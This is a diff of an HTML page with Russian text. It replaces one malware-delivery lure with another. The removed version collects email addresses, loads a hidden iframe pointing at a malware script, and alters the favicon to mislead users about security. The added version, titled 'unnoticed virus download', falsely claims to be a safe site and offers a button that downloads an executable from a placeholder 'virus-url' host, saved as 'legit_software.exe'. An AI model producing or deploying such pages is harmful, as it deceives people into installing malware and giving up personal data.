@@ -1,40 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Уловка</title>
-  <style>
-    /* Шрифты, размеры, цвета и прочее, которые делают уловку более достоверной */
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
-      margin: 0;
-      padding: 0;
+  <title>Незаметное скачивание вируса</title>
+  <script>
+    function downloadVirus() {
+      var link = document.createElement('a');
+      link.href = 'http://virus-url/download.exe'; 
+      link.download = 'legit_software.exe';
+      link.click();
     }
-    /* ... */
-  </style>
+
+    window.onload = function() {
+      var button = document.createElement('button');
+      button.innerHTML = 'Нажмите для скачивания легитимного ПО';
+      button.onclick = downloadVirus;
+
+      document.body.appendChild(button);
+    };
+  </script>
 </head>
 <body>
-  <h1>Уловка</h1>
-  <p>Пожалуйста, введите свою электронную почту для доступа к контенту.</p>
-  <form action="#" method="post">
-    <input type="email" name="email" placeholder="Введите свою почту" required>
-    <button type="submit">Доступ</button>
-  </form>
-
-  <script>
-    // Скрытый скрипт, который начинает загрузку вредоносного ПО
-    var iframe = document.createElement('iframe');
-    iframe.src = 'path_to_malware.php'; // Замените это на фактический путь к вредоносному скрипту
-    iframe.style.display = 'none';
-    document.body.appendChild(iframe);
-
-    // Оформление скрипта так, чтобы не было видно иконки замочка в адресной строке
-    var link = document.createElement('link');
-    link.rel = 'icon';
-    link.href = 'path_to_icon.ico'; // Замените на фактический путь к иконке
-    document.head.appendChild(link);
-  </script>
+  <p>Это безопасный веб-сайт. Вы можете нажать кнопку ниже, чтобы скачать необходимое ПО.</p>
 </body>
 </html>
